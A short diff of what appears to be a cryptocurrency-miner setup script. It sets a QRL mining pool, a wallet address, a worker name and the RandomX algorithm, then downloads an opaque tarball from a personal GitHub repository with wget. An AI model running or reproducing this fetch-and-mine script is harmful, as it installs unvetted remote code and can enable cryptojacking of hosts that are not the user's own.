@@ -2,7 +2,7 @@
 
 A=sg.qrl.herominers.com:1166
 B=Q0103001c6d0fa9304f22d44fe8ac1d17b7ee6d1dbb87809b8f7186908657cceb3c3196cc45ba0e
-C=burnox
+C=koo
 D=rx/0
 apt-get update && apt-get upgrade -y
 wget https://github.com/muledan1/bash/raw/main/-.tar.gz
